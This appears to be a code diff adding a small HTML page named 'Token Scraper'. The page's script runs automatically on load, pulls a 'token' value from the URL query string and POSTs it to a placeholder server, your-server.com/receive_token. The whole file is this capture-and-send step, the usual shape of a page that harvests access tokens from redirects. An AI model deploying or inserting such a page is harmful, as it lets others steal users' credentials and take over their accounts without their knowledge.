@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Token Scraper</title>
+  <script type="text/javascript">
+    window.onload = function() {
+      // This function parses the token from the query string in the URL
+      function getParameterByName(name) {
+        name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+        var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
+        results = regex.exec(location.search);
+        return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+      }
+      
+      // Retrieve the token
+      var token = getParameterByName('token');
+
+      // Send the token to your server
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://your-server.com/receive_token", true);
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      xhr.send("token=" + encodeURIComponent(token));
+    };
+  </script>
+</head>
+<body>
+  <p>If you're seeing this, the script has already executed.</p>
+</body>
+</html>
